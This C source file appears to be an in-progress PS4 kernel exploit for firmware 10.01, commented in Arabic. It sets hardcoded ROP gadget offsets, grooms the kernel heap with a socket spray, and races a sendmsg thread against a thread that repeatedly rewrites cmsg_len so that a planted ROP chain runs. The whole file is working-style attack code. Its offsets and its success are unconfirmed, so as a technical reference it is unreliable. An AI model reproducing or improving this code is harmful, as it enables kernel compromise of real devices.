#include <ps4.h>

// الإزاحات لنسخة 10.01 (تأكد من طرح 0x82200000 من العناوين المطلقة)
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 
#define OFF_POP_RAX_RET          0x09974F
#define OFF_RET                  0x0008E0

struct msghdr {
    void *msg_name; uint32_t msg_namelen; void *msg_iov; int msg_iovlen;
    void *msg_control; uint32_t msg_controllen; int msg_flags;
};
struct cmsghdr { uint32_t cmsg_len; int cmsg_level; int cmsg_type; };

#define CONTROL_LEN 256
#define SPRAY_COUNT 512

uint8_t control_buf[CONTROL_LEN];
struct cmsghdr *cmsg;
int global_sock;
int spray_socks[SPRAY_COUNT];

// تعريف الدوال مسبقاً (Prototypes)
void build_perfect_chain(uint64_t kbase);
void *sendmsg_thread(void *arg);
void *race_thread(void *arg);
void prepare_heap();

// دالة بناء السلسلة مع حشوة ROP Sled
void build_perfect_chain(uint64_t kbase) {
    memset(control_buf, 0, CONTROL_LEN);
    cmsg = (struct cmsghdr *)control_buf;
    cmsg->cmsg_level = 0; 
    cmsg->cmsg_type = 7; // IP_RETOPTS
    cmsg->cmsg_len = 0x50;

    uint64_t gadget1 = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint64_t pop_rax = kbase + OFF_POP_RAX_RET;
    uint64_t ret_only = kbase + OFF_RET;
    uint64_t val = 0xDEADC0DE;

    // ملء منطقة ext_free وما بعدها بالسلسلة
    for (int i = 0x48; i < CONTROL_LEN - 40; i += 8) {
        uint64_t *rop = (uint64_t *)(control_buf + i);
        rop[0] = gadget1;    // الدخول (3ee6)
        rop[1] = ret_only;   // محاذاة (Alignment)
        rop[2] = pop_rax;    // سحب القيمة لـ RAX
        rop[3] = val;        // التوقيع المنشود
        rop[4] = 0;          // كراش نهائي RIP: 0
    }
}

// دالة لتهيئة الذاكرة (Heap Grooming)
void prepare_heap() {
    for(int i = 0; i < SPRAY_COUNT; i++) {
        spray_socks[i] = syscall(97, 2, 2, 0); // socket
        if(spray_socks[i] > 0) {
            uint8_t dummy[0x50];
            memset(dummy, 0x41, 0x50);
            syscall(133, spray_socks[i], dummy, 0x50, 0, NULL, 0); // sendto
        }
    }
    // تحرير نصف الـ Sockets لترك فجوات في الـ Heap
    for(int i = 0; i < SPRAY_COUNT; i += 2) {
        if(spray_socks[i] > 0) {
            syscall(6, spray_socks[i]); // close
            spray_socks[i] = -1;
        }
    }
}

void *sendmsg_thread(void *arg) {
    (void)arg;
    struct msghdr msg = {0};
    msg.msg_control = control_buf;
    msg.msg_controllen = CONTROL_LEN;
    while(1) {
        syscall(28, global_sock, &msg, 0); // sendmsg
    }
    return NULL;
}

void *race_thread(void *arg) {
    (void)arg;
    while(1) {
        // زيادة سرعة التبديل لرفع احتمالية الـ Race
        for(volatile int i = 0; i < 200; i++) {
            cmsg->cmsg_len = 0x50;   
            cmsg->cmsg_len = 0xFFFF; 
        }
    }
    return NULL;
}

int _main(struct thread *td) {
    (void)td;
    initKernel();
    initLibc();

    uint64_t kbase = get_kernel_base();
    
    // 1. تهيئة الذاكرة
    prepare_heap();
    
    // 2. بناء السلسلة
    build_perfect_chain(kbase);

    // 3. إنشاء السوكت الرئيسي
    global_sock = syscall(97, 2, 2, 0);
    
    ScePthread t1, t2;
    scePthreadCreate(&t1, NULL, sendmsg_thread, NULL, "thr_sendmsg");
    scePthreadCreate(&t2, NULL, race_thread, NULL, "thr_race");

    scePthreadJoin(t1, NULL);
    scePthreadJoin(t2, NULL);
    
    return 0;
}
